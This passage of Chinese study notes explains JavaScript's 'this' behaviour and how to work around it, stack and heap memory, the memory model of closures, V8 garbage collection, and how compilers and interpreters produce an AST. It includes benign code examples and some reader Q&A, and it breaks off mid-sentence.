引擎做了如下四件事：\n首先创建了一个空对象 tempObj；\n接着调用 CreateObj.call 方法，并将 tempObj 作为 call 方法的参数，这样当 CreateObj 的执行上下文创建时，它的 this 就指向了 tempObj 对象；\n然后执行 CreateObj 函数，此时的 CreateObj 函数执行上下文中的 this 指向了 tempObj 对象；\n最后返回 tempObj 对象。\n1 2 3 var tempObj = {}; CreateObj.call(tempObj); return tempObj; this 的设计缺陷以及应对方案 嵌套函数中的 this 不会从外层函数中继承\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 var myObj = { name: \u0026#34;极客时间\u0026#34;, showThis: function () { console.log(this); function bar() { console.log(this); } bar(); }, }; myObj.showThis(); var myObj = { name: \u0026#34;极客时间\u0026#34;, showThis: function () { console.log(this); var self = this; function bar() { self.name = \u0026#34;极客邦\u0026#34;; } bar(); }, }; myObj.showThis(); console.log(myObj.name); console.log(window.name); // 这个方法的的本质是把 this 体系转换为了作用域的体系。********************************** var myObj = { name: \u0026#34;极客时间\u0026#34;, showThis: function () { console.log(this); var bar = () =\u0026gt; { this.name = \u0026#34;极客邦\u0026#34;; console.log(this); }; bar(); }, }; myObj.showThis(); console.log(myObj.name); console.log(window.name); //ES6 中的箭头函数并不会创建其自身的执行上下文，所以箭头函数中的 this 取决于它的外部函数。 this 没有作用域的限制，这点和变量不一样，所以嵌套函数不会从调用它的函数中继承 this，这样会造成很多不符合直觉的代码。要解决这个问题，可以有两种思路：\n第一种是把 this 保存为一个 self 变量，再利用变量的作用域机制传递给嵌套函数。 第二种是继续使用 this，但是要把嵌套函数改为箭头函数，因为箭头函数没有自己的执行上下文，所以它会继承调用函数中的 this。 普通函数中的 this 默认指向全局对象 window\n在默认情况下调用一个函数，其执行上下文中的 this 是默认指向全局对象 window 的。在实际工作中，并不希望函数执行上下文中的 this 默认指向全局对象，因为这样会打破数据的边界，造成一些误操作。如果要让函数执行上下文中的 this 指向某个对象，最好的方式是通过 call 方法来显示调用。\n这个问题可以通过设置 JavaScript 的“严格模式”来解决。在严格模式下，默认执行一个函数，其函数的执行上下文中的 this 值是 undefined，这就解决上面的问题了。\n问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: male, updateInfo: function () { //模拟xmlhttprequest请求延时 setTimeout(function () { this.name = \u0026#34;pony.ma\u0026#34;; this.age = 39; this.sex = female; }, 100); }, }; userInfo.updateInfo(); 要求：通过 updateInfo 来更新 userInfo 里面的数据信息\n回答：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 // 修改方法一：箭头函数最方便 let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: \u0026#34;male\u0026#34;, updateInfo: function () { // 模拟 xmlhttprequest 请求延时 setTimeout(() =\u0026gt; { this.name = \u0026#34;pony.ma\u0026#34;; this.age = 39; this.sex = \u0026#34;female\u0026#34;; }, 100); }, }; userInfo.updateInfo(); setTimeout(() =\u0026gt; { console.log(userInfo); }, 200); // 修改方法二：缓存外部的this let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: \u0026#34;male\u0026#34;, updateInfo: function () { let me = this; // 模拟 xmlhttprequest 请求延时 setTimeout(function () { me.name = \u0026#34;pony.ma\u0026#34;; me.age = 39; me.sex = \u0026#34;female\u0026#34;; }, 100); }, }; userInfo.updateInfo(); setTimeout(() =\u0026gt; { console.log(userInfo); }, 200); // 修改方法三，其实和方法二的思路是相同的 let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: \u0026#34;male\u0026#34;, updateInfo: function () { // 模拟 xmlhttprequest 请求延时 void (function (me) { setTimeout(function () { me.name = \u0026#34;pony.ma\u0026#34;; me.age = 39; me.sex = \u0026#34;female\u0026#34;; }, 100); })(this); }, }; userInfo.updateInfo(); setTimeout(() =\u0026gt; { console.log(userInfo); }, 200); let update = function () { this.name = \u0026#34;pony.ma\u0026#34;; this.age = 39; this.sex = \u0026#34;female\u0026#34;; }; 方法四: 利用call或apply修改函数被调用时的this值(不知掉这么描述正不正确); let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: \u0026#34;male\u0026#34;, updateInfo: function () { // 模拟 xmlhttprequest 请求延时 setTimeout(function () { update.call(userInfo); // update.apply(userInfo) }, 100); }, }; userInfo.updateInfo(); setTimeout(() =\u0026gt; { console.log(userInfo); }, 200); // 方法五: 利用bind返回一个新函数，新函数被调用时的this指定为userInfo let userInfo = { name: \u0026#34;jack.ma\u0026#34;, age: 13, sex: \u0026#34;male\u0026#34;, update: function () { this.name = \u0026#34;pony.ma\u0026#34;; this.age = 39; this.sex = \u0026#34;female\u0026#34;; }, updateInfo: function () { // 模拟 xmlhttprequest 请求延时 setTimeout(this.update.bind(this), 100); }, }; 如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。 如果是严格模式，那么 this 会被设置为 undefined。\n箭头函数在执行时比块级作用域的内容多，比函数执行上下文的内容少，砍掉了很多函数执行上下文中的组件。 不过在箭头函数在执行时也是有变量环境的，因为还要支持变量提升！所以变量环境的模块还是砍不掉的。\nthis 的缺陷并不是浏览器实现机制导致的，而是浏览器按照标准来实现的。 其实浏览器说我可以实现得更好，但是标准摆在这儿，大家都只认标准！\n栈空间和堆空间 JavaScript 的内存机制，JavaScript 中的数据是如何存储在内存中的。JavaScript 并不需要直接去管理内存，但是在实际项目中为了能避开一些不必要的坑，你还是需要了解数据在内存中的存储方式的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function foo() { var a = 1; var b = a; a = 2; console.log(a); console.log(b); } foo(); function foo() { var a = { name: \u0026#34;极客时间\u0026#34; }; var b = a; a.name = \u0026#34;极客邦\u0026#34;; console.log(a); console.log(b); } foo(); JavaScript 是什么类型的语言 每种编程语言都具有内建的数据类型，但它们的数据类型常有不同之处，使用方式也很不一样，比如 C 语言在定义变量之前，就需要确定变量的类型：\n1 2 3 4 5 6 7 int main() { int a = 1; char* b = \u0026#34;极客时间\u0026#34;; bool c = true; return 0; } 在声明变量之前需要先定义变量类型。把这种在使用之前就需要确认其变量数据类型的称为静态语言。在运行过程中需要检查数据类型的语言称为动态语言。\n虽然 C 语言是静态，但是在 C 语言中，可以把其他类型数据赋予给一个声明好的变量，如：\n1 c = a 前面代码中，把 int 型的变量 a 赋值给了 bool 型的变量 c，这段代码也是可以编译执行的，因为在赋值过程中，C 编译器会把 int 型的变量悄悄转换为 bool 型的变量，通常把这种偷偷转换的操作称为隐式类型转换。而支持隐式类型转换的语言称为弱类型语言，不支持隐式类型转换的语言称为强类型语言。\n弱类型，意味着不需要告诉 JavaScript 引擎这个或那个变量是什么数据类型，JavaScript 引擎在运行代码的时候自己会计算转换。 动态，意味着可以使用同一个变量保存不同类型的数据。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var bar; bar = 12; bar = \u0026#34;极客时间\u0026#34;; bar = true; bar = null; bar = { name: \u0026#34;极客时间\u0026#34; }; var bar; console.log(typeof bar); //undefined bar = 12; console.log(typeof bar); //number bar = \u0026#34;极客时间\u0026#34;; console.log(typeof bar); //string bar = true; console.log(typeof bar); //boolean bar = null; console.log(typeof bar); //object bar = { name: \u0026#34;极客时间\u0026#34; }; console.log(typeof bar); //object JavaScript 到底有多少种数据类型:\n第一点，使用 typeof 检测 Null 类型时，返回的是 Object。这是当初 JavaScript 语言的一个 Bug，一直保留至今，之所以一直没修改过来，主要是为了兼容老的代码。\n第二点，Object 类型比较特殊，它是由上述 7 种类型组成的一个包含了 key-value 对的数据类型。如下所示：\n1 2 3 4 let myObj = { name:\u0026#39;极客时间\u0026#39;, update:function(){....} } 第三点，把前面的 7 种数据类型称为原始类型，把最后一个对象类型称为引用类型，之所以把它们区分为两种不同的类型，是因为它们在内存中存放的位置不一样。\n内存空间 要理解 JavaScript 在运行过程中数据是如何存储的，就得先搞清楚其存储空间的种类。下面是画的 JavaScript 的内存模型，可以参考下：\n在 JavaScript 的执行过程中， 主要有三种类型内存空间，分别是代码空间、栈空间和堆空间。\n代码空间主要是存储可执行代码。\n栈空间和堆空间 这里的栈空间就是之前提及的调用栈，是用来存储执行上下文的。为了搞清楚栈空间是如何存储数据的，还是先看下面这段代码：\n1 2 3 4 5 6 7 function foo() { var a = \u0026#34;极客时间\u0026#34;; var b = a; var c = { name: \u0026#34;极客时间\u0026#34; }; var d = c; } foo(); 当执行一段代码时，需要先编译，并创建执行上下文入栈，然后再按照顺序执行代码。当执行到第 3 行代码时，其调用栈的状态，可以参考下面这张调用栈状态图：\n当执行到第 3 行时，变量 a 和变量 b 的值都被保存在执行上下文中，而执行上下文又被压入到栈中，所以你也可以认为变量 a 和变量 b 的值都是存放在栈中的。\n接下来继续执行第 4 行代码，由于 JavaScript 引擎判断右边的值是一个引用类型，JavaScript 引擎并不是直接将该对象存放到变量环境中，而是将它分配到堆空间里面，分配后该对象会有一个在“堆”中的地址，然后再将该数据的地址写进 c 的变量值，最终分配好内存的示意图如下所示：\n对象类型是存放在堆空间的，在栈空间中只是保留了对象的引用地址，当 JavaScript 需要访问该数据的时候，是通过栈中的引用地址来访问的，相当于多了一道转手流程。\n原始类型的数据值都是直接保存在“栈”中的，引用类型的值是存放在“堆”中的。\n为什么一定要分“堆”和“栈”两个存储空间呢？所有数据直接存放在“栈”中不就可以了吗？\n答案是不可以的。这是因为 JavaScript 引擎需要用栈来维护程序执行期间上下文的状态，如果栈空间大了话，所有的数据都存放在栈空间里面，那么会影响到上下文切换的效率，进而又影响到整个程序的执行效率。比如文中的 foo 函数执行结束了，JavaScript 引擎需要离开当前的执行上下文，只需要将指针下移到上个执行上下文的地址就可以了，foo 函数执行上下文栈区空间全部回收，具体过程你可以参考下图：\n所以通常情况下，栈空间都不会设置太大，主要用来存放一些原始类型的小数据。而引用类型的数据占用的空间都比较大，所以这一类数据会被存放到堆中，堆空间很大，能存放很多大的数据，不过缺点是分配内存和回收内存都会占用一定的时间。\n解释了程序在执行过程中为什么需要堆和栈两种数据结构后，还是回到示例代码那里，看看它最后一步将变量 c 赋值给变量 d 是怎么执行的？\n在 JavaScript 中，赋值操作和其他语言有很大的不同，原始类型的赋值会完整复制变量值，而引用类型的赋值是复制引用地址。\n所以 d=c 的操作就是把 c 的引用地址赋值给 d，你可以参考下图：\n闭包的内存模型 作用域内的原始类型数据会被存储到栈空间，引用类型会被存储到堆空间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function foo() { var myName = \u0026#34;极客时间\u0026#34;; let test1 = 1; const test2 = 2; var innerBar = { setName: function (newName) { myName = newName; }, getName: function () { console.log(test1); return myName; }, }; return innerBar; } var bar = foo(); bar.setName(\u0026#34;极客邦\u0026#34;); bar.getName(); console.log(bar.getName()); 当执行这段代码时，应该有过这样的分析：由于变量 myName、test1、test2 都是原始类型数据，所以在执行 foo 函数的时候，它们会被压入到调用栈中；当 foo 函数执行结束之后，调用栈中 foo 函数的执行上下文会被销毁，其内部变量 myName、test1、test2 也应该一同被销毁。\n但是在前面，介绍了当 foo 函数的执行上下文销毁时，由于 foo 函数产生了闭包，所以变量 myName 和 test1 并没有被销毁，而是保存在内存中，那么应该如何解释这个现象呢？\n要解释这个现象，得站在内存模型的角度来分析这段代码的执行流程。\n当 JavaScript 引擎执行到 foo 函数时，首先会编译，并创建一个空执行上下文。 在编译过程中，遇到内部函数 setName，JavaScript 引擎还要对内部函数做一次快速的词法扫描，发现该内部函数引用了 foo 函数中的 myName 变量，由于是内部函数引用了外部函数的变量，所以 JavaScript 引擎判断这是一个闭包，于是在堆空间创建一个“closure(foo)”的对象（这是一个内部对象，JavaScript 是无法访问的），用来保存 myName 变量。 接着继续扫描到 getName 方法时，发现该函数内部还引用变量 test1，于是 JavaScript 引擎又将 test1 添加到“closure(foo)”对象中。这时候堆中的“closure(foo)”对象中就包含了 myName 和 test1 两个变量了。 由于 test2 并没有被内部函数引用，所以 test2 依然保存在调用栈中。 通过上面的分析，可以画出执行到 foo 函数中“return innerBar”语句时的调用栈状态，如下图所示：\n当执行到 foo 函数时，闭包就产生了；当 foo 函数执行结束之后，返回的 getName 和 setName 方法都引用“closure(foo)”对象，所以即使 foo 函数退出，“ closure(foo)”依然被其内部的 getName 和 setName 方法引用。所以在下次调用 bar.setName 或者 bar.getName 时，创建的执行上下文中就包含了“closure(foo)”。\n总的来说，产生闭包的核心有两步：第一步是需要预扫描内部函数；第二步是把内部函数引用的外部变量保存到堆中。\nJavaScript 的变量是没有数据类型的，值才有数据类型，变量可以随时持有任何类型的数据。\n问题：如何将对象 jack 拷贝给 jack2，然后在完成拷贝操作时两个 jack 还互不影响。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 let jack = { name: \u0026#34;jack.ma\u0026#34;, age: 40, like: { dog: { color: \u0026#34;black\u0026#34;, age: 3, }, cat: { color: \u0026#34;white\u0026#34;, age: 2, }, }, }; function copy(src) { let dest; //实现拷贝代码，将src的值完整地拷贝给dest //在这里实现 return dest; } let jack2 = copy(jack); //比如修改jack2中的内容，不会影响到jack中的值 jack2.like.dog.color = \u0026#34;green\u0026#34;; console.log(jack.like.dog.color); //打印出来的应该是 \u0026#34;black\u0026#34; 问：\n1、从内存模型角度分析执行代码的执行流程第二步看，在堆空间创建 closure(foo)对象，它是存储在 foo 函数的执行上下文中的。 那么 closure(foo)创建开始时是空对象，执行第三步的时候，才会逐渐把变量添加到其中。 2、当 foo 函数执行结束后，foo 的执行上下文是不是销毁了？如果销毁了，产生一下两个疑问： a、如果 foo 函数执行上下文销毁了，closure(foo)并没有销毁，那 foo 函数执行上下文是怎么销毁的呢？就比如销毁一个盒子，盒子毁里，里面的东西应该也是毁掉的 b、既然 closure(foo)既然没有销毁，那它存储在堆中的什么地方呢？必定它所依赖的 foo 执行上下文已经不存在了\n作者回复: 关于 foo 函数执行上下文销毁过程：foo 函数执行结束之后，当前执行状态的指针下移到栈中的全局执行上下文的位置，foo 函数的执行上下文的那块数据就挪出来，这也就是 foo 函数执行上下文的销毁过程，这个文中有提到，你可以参考“调用栈中切换执行上下文状态“图。 第二个问题：innerBar 返回后，含有 setName 和 getName 对象，这两个对象里面包含了堆中的 closure(foo)的引用。虽然 foo 执行上下文销毁了，foo 函数中的对 closure(foo)的引用也断开了，但是 setName 和 getName 里面又重新建立起来了对 closure(foo)引用。 你可以：\n1:打开“开发者工具”\n2:在控制台执行上述代码\n3:然后选择“Memory”标签，点击\u0026quot;take snapshot\u0026rdquo; 获取 V8 的堆内存快照。\n4:然后“command+f\u0026rdquo;(mac) 或者 \u0026ldquo;ctrl+f\u0026rdquo;(win),搜索“setName”，然后你就会发现 setName 对象下面包含了 raw_outer_scope_info_or_feedback_metadata，对闭包的引用数据就在这里面。\n垃圾回收 有些数据被使用之后，可能就不再需要了，把这种数据称为垃圾数据。如果这些垃圾数据一直保存在内存中，那么内存会越用越多，所以需要对这些垃圾数据进行回收，以释放有限的内存空间。\n不同语言的垃圾回收策略 通常情况下，垃圾数据回收分为手动回收和自动回收两种策略。\n如 C/C++ 就是使用手动回收策略，何时分配内存、何时销毁内存都是由代码控制的，可以参考下面这段 C 代码：\n1 2 3 4 5 6 7 8 9 10 11 //在堆中分配内存 char* p = (char*)malloc(2048); //在堆空间中分配2048字节的空间，并将分配后的引用地址保存到p中 //使用p指向的内存 { //.... } //使用结束后，销毁这段内存 free(p)； p = NULL； 从上面这段 C 代码可以看出来，要使用堆中的一块空间，需要先调用 mallco 函数分配内存，然后再使用；当不再需要这块数据的时候，就要手动调用 free 函数来释放内存。如果这段数据已经不再需要了，但是又没有主动调用 free 函数来销毁，那么这种情况就被称为内存泄漏。\n另外一种使用的是自动垃圾回收的策略，如 JavaScript、Java、Python 等语言，产生的垃圾数据是由垃圾回收器来释放的，并不需要手动通过代码来释放。\n因为数据是存储在栈和堆两种内存空间中的，所以接下来分别介绍“栈中的垃圾数据”和“堆中的垃圾数据”是如何回收的。\n调用栈中的数据回收 1 2 3 4 5 6 7 8 9 10 function foo() { var a = 1; var b = { name: \u0026#34; 极客邦 \u0026#34; }; function showName() { var c = \u0026#34; 极客时间 \u0026#34;; var d = { name: \u0026#34; 极客时间 \u0026#34; }; } showName(); } foo(); 当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：\n当 foo 函数执行结束之后，foo 函数的执行上下文会从堆中被销毁掉，那么它是怎么被销毁的呢？\n如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个记录当前执行状态的指针（称为 ESP），指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。\n当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文了。JavaScript 会将 ESP 下移到 foo 函数的执行上下文，这个下移操作就是销毁 showName 函数执行上下文的过程。\nESP 指针向下移动怎么就能把 showName 的执行上下文销毁了呢？具体可以看下面这张移动 ESP 前后的对比图：\n从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。\n所以说，当一个函数执行结束之后，JavaScript 引擎会通过向下移动 ESP 来销毁该函数保存在栈中的执行上下文。\n堆中的数据是如何回收的 当上面那段代码的 foo 函数执行结束之后，ESP 应该是指向全局执行上下文的，showName 函数和 foo 函数的执行上下文就处于无效状态了，不过保存在堆中的两个对象依然占用着空间，如下图所示：\n从图中可以看出，1003 和 1050 这两块内存依然被占用。要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器。\n堆中的垃圾数据回收\n前置知识：\n代际假说：\n大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问； 有些对象存在的时间会更长 垃圾回收算法有很多种，但是并没有哪一种能胜任所有的场景，需要权衡各种场景，根据对象的生存周期的不同而使用不同的算法，以便达到最好的效果。\n所以，在 V8 中会把堆分为新生代和老生代两个区域，新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象。新生区通常只支持 1 ～ 8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。\n副垃圾回收器，主要负责新生代的垃圾回收。 主垃圾回收器，主要负责老生代的垃圾回收。 垃圾回收器的工作流程 不论什么类型的垃圾回收器，它们都有一套共同的执行流程。\n第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。\n第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。\n第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为内存碎片。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。所以最后一步需要整理这些内存碎片，但这步其实是可选的，因为有的垃圾回收器不会产生内存碎片，比如接下来我们要介绍的副垃圾回收器。\n副垃圾回收器 副垃圾回收器主要负责新生区的垃圾回收。而通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。\n新生代中用Scavenge 算法来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：\n新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。\n在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。\n完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种角色翻转的操作还能让新生代中的这两块区域无限重复使用下去。\n由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以为了执行效率，一般新生区的空间会被设置得比较小。\n也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了对象晋升策略，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。\n主垃圾回收器 主垃圾回收器主要负责老生区中的垃圾回收。除了新生区中晋升的对象，一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。\n由于老生区的对象比较大，若要在老生区中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。因而，主垃圾回收器是采用**标记 - 清除（Mark-Sweep）**的算法进行垃圾回收的。下面我们来看看该算法是如何工作的。\n首先是标记过程阶段。标记阶段就是从遍历调用栈中的一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为活动对象，没有到达的元素就可以判断为垃圾数据。\n比如最开始的那段代码，当 showName 函数执行退出之后，这段代码的调用栈和堆空间如下图所示：\n从上图你可以大致看到垃圾数据的标记过程，当 showName 函数执行结束之后，ESP 向下移动，指向了 foo 函数的执行上下文，这时候如果遍历调用栈，是不会找到引用 1003 地址的变量，也就意味着 1003 这块数据为垃圾数据，被标记为红色。由于 1050 这块数据被变量 b 引用了，所以这块数据会被标记为活动对象。这就是大致的标记过程。\n接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，你可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：\n上面的标记过程和清除过程就是标记 - 清除算法，不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法——标记 - 整理（Mark-Compact），这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。你可以参考下图：\n全停顿 由于 JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做全停顿（Stop-The-World）。\n比如堆中的数据有 1.5GB，V8 实现一次完整的垃圾回收需要 1 秒以上的时间，这也是由于垃圾回收而引起 JavaScript 线程暂停执行的时间，若是这样的时间花销，那么应用的性能和响应能力都会直线下降。主垃圾回收器执行一次完整的垃圾回收流程如下图所示：\n在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样了。如果在执行垃圾回收的过程中，占用主线程时间过久，就像上面图片展示的那样，花费了 200 毫秒，在这 200 毫秒内，主线程是不能做其他事情的。比如页面正在执行一个 JavaScript 动画，因为垃圾回收器在工作，就会导致这个动画在这 200 毫秒内无法执行的，这将会造成页面的卡顿现象。\n为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为增量标记（Incremental Marking）算法。如下图所示：\n使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行，这样当执行上述动画效果时，就不会让用户因为垃圾回收任务而感受到页面的卡顿了。\n问题： 你是如何判断 JavaScript 中内存泄漏的？\n一般是感官上的长时间运行页面卡顿，猜可能会有内存泄漏。通过 DynaTrace（IE）profiles，Chrome 开发者工具中的 Performance 等工具一段时间收集数据，观察对象的使用情况。然后判断是否存在内存泄漏。修改后验证\n工作中避免内存泄漏方法：确定不使用的临时变量置为 null，当前 es6 普及场景下少使用闭包也是一种方法。\n新生区和老生区标记过程是同一个过程，之后新生代把存活的数据移动到空闲区，老生代把死去的对象加到空闲列表中。\n对于栈中的垃圾回收，是通过移动 ESP 指针来实现的，是不需要通过 V8 的垃圾回收机制的吗？是的，栈中的过期数据直接通过 esp 给抹掉，效率非常高。\n会的，副垃圾回收器执行速度快，而且容易满，所以回收频率会比主垃圾回收器高。\n栈垃圾回收 当函数执行结束，JS 引擎通过向下移动 ESP 指针（记录调用栈当前执行状态的指针），来销毁该函数保存在栈中的执行上下文（变量环境、词法环境、this、outer）。\n堆垃圾回收\n一、代际假说\n1、大部分对象存活时间很短\n2、不被销毁的对象，会活的更久\n二、分类 V8 中会把堆分为新生代和老生代两个区域，新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象。\n三、新生代 算法：Scavenge 算法\n原理：\n1、把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域。\n2、新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。\n3、先对对象区域中的垃圾做标记，标记完成之后，把这些存活的对象复制到空闲区域中\n4、完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。 对象晋升策略： 经过两次垃圾回收依然还存活的对象，会被移动到老生区中。\n四、老生代\n算法：标记 - 清除（Mark-Sweep）算法\n原理：\n1、标记：标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为活动对象，没有到达的元素就可以判断为垃圾数据。\n2、清除：将垃圾数据进行清除。 碎片： 对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存。\n算法：标记 - 整理（Mark-Compact）算法\n原理： 1、标记：和标记 - 清除的标记过程一样，从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素标记为活动对象。\n2、整理：让所有存活的对象都向内存的一端移动\n3、清除：清理掉端边界以外的内存\n优化算法：增量标记（Incremental Marking）算法\n原理：\n1、为了降低老生代的垃圾回收而造成的卡顿\n2、V8 把一个完整的垃圾回收任务拆分为很多小的任务\n3、让垃圾回收标记和 JavaScript 应用逻辑交替进行\n编译器和解释器 V8 执行 JavaScript 的过程。\n深入理解前端工具和框架（语言转换器 Babel、语法检查工具 ESLint、前端框架 Vue 和 React 的一些底层实现机制），就需要这些本质的知识，然后才能理解这些上层应用。\n前置的概念：**编译器（Compiler）、解释器（Interpreter）、抽象语法树（AST）、字节码（Bytecode）、即时编译器（JIT）**等概念。\n编译器和解释器 计算机不能直接理解我们所写的代码，所以在执行程序之前，需要将我们所写的代码“翻译“（编译器和解释器）成机器能读懂的机器语言。按语言的执行流程，可以把语言划分为编译型语言和解释型语言。\n编译型语言在程序执行之前，需要经过编译器的编译过程，并且编译之后会直接保留机器能读懂的二进制文件，这样每次运行程序时，都可以直接运行该二进制文件，而不需要再次重新编译了。比如 C/C++、GO 等都是编译型语言。\n而由解释型语言编写的程序，在每次运行时都需要通过解释器对程序进行动态解释和执行。比如 Python、JavaScript 等都属于解释型语言。\n在编译型语言的编译过程中，编译器首先会依次对源代码进行词法分析、语法分析，生成抽象语法树（AST），然后是优化代码，最后再生成处理器能够理解的机器码。如果编译成功，将会生成一个可执行的文件。但如果编译过程发生了语法或者其他的错误，那么编译器就会抛出异常，最后的二进制文件也不会生成成功。 在解释型语言的解释过程中，解释器也会对源代码进行词法分析、语法分析，并生成抽象语法树（AST），不过它会再基于抽象语法树生成字节码，最后再根据字节码来执行程序、输出结果。 V8 执行一段 JS 代码 V8 在执行过程中既有解释器 Ignition，又有编译器 TurboFan，那么它们是如何配合去执行一段 JavaScript 代码的呢?\n生成抽象语法树（AST）和执行上下文 将源代码转换为抽象语法树，并生成执行上下文，而执行上下文主要是代码在执行过程中的环境信息。\n什么是 AST\n高级语言是开发者可以理解的语言，但是让编译器或者解释器来理解就非常困难了。对于编译器或者解释器来说，它们可以理解的就是 AST 了。无论是解释型语言还是编译型语言，在编译过程中，它们都会生成一个 AST。这和渲染引擎将 HTML 格式文件转换为计算机可以理解的 DOM 树的情况类似。\n结合下面这段代码来直观地感受下什么是 AST：\n1 2 3 4 5 6 var myName = \u0026#34; 极客时间 \u0026#34;; function foo() { return 23; } myName = \u0026#34;geektime\u0026#34;; foo(); 这段代码经过javascript-ast站点处理后，生成的 AST 结构如下：\n从图中可以看出，AST 的结构和代码的结构非常相似， AST 是代码的结构化的表示，编译器或者解释器后续的工作都需要依赖于 AST，而不是源代码。\nBabel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。\nESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。\nAST 是如何生成的\n通常，生成 AST 需要经过两个阶段。\n第一阶段是分词（tokenize），又称为词法分析，其作用是将一行行的源码拆解成一个个 token。所谓token，指的是语法上不可能再分的、最小的单个字符或字符串。\n关键字“var”、标识符“myName” 、赋值运算符“=”、字符串“极客时间”四个都是 token，而且它们代表的属性还不一样。\n第二阶段是解析（parse），又称为语法分析，其作用是将上一步生成的 token 数据，根据语法规则转为 